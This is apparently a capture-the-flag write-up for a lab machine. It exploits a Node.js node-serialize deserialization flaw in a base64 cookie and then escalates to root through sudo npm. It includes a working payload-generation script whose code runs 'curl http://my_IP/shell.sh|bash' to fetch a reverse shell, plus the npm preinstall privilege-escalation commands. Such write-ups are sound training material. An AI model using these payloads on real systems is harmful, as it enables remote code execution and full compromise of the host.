# Jax sucks alot.............

### Jax sucks alot.............
Nmap shows ports 22 and 80 open. Port 80 is just one page, I enumerated with nikto, ffuf etc.. and there's only this page I need to exploit: <br />
![image](https://github.com/user-attachments/assets/48558b18-0e5a-485a-ae59-4e5f5a746ffb)<br />
If I capture a response and a request with burpsuite, I can see that the response contains a `set-cookie` header: <br />
![image](https://github.com/user-attachments/assets/328eb1dd-6ae1-4612-b951-f5f90b56e6e8)<br />
If I base64 decode the string, I get: `{"email":"test?email=test"}`. <br />
After testing a bit, this is a nodejs json deserialization vulnerability inside the cookie value. To exploit it I need to create a JSON serialized payload containing a self-executing function, and see if the server executes that function.<br /> To test if it works,
I'm going to send the following payload `eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyByZXR1cm4gNyo3OyB9KCkifQ==` as cookie value. This is the base64 encoded string of `{"email":"_$$ND_FUNC$$_function(){ return 7*7; }()"}`:<br />
![image](https://github.com/user-attachments/assets/caf8e6f7-3a26-4de5-b43f-52dc19829959)<br />
This confirms that the code gets executed. I now need to spawn a reverse shell. To do that, I will serialize the following payload. 

To serialize it, I used this script:

    var serialize = require('node-serialize');
    
    var payload = {
      email: "_$$ND_FUNC$$_function(){ require('child_process').exec('curl http://my_IP/shell.sh|bash'); }()"
    };
    
    var serializedPayload = serialize.serialize(payload);
    
    var encodedBase64 = Buffer.from(serializedPayload).toString('base64');
    
    console.log("Serialized and Base64 Encoded Payload: \n" + encodedBase64);
Then run it using node. I then created a reverse shell script in my local machine called `shell.sh`, opened a python web server and a netcat listener, and I got the reverse shell after sending the payload:<br />
![image](https://github.com/user-attachments/assets/39794b06-5209-40e2-bc1a-52d438c4ecd5)<br />
The nodeJS server script confirms the presence of the vulnerable function `unserialize`:<br />
![image](https://github.com/user-attachments/assets/68163b57-41b5-4590-98f6-436af577397b)<br />
Now for privesc, as dylan if I run `sudo -l` I get:<br />
![image](https://github.com/user-attachments/assets/abf959e1-8266-4548-b978-3f1de092e244)<br />
The exploit for sudo on `nmp` can be found on [gtfobins](https://gtfobins.github.io/gtfobins/npm/#sudo). Just go inside a writable folder by dylan such as `/tmp` or `/home/dylan` and run the following commands and spawn a shell as root!

    mkdir tmp
    echo '{"scripts": {"preinstall": "/bin/sh"}}' > tmp/package.json
    sudo npm -C tmp --unsafe-perm i


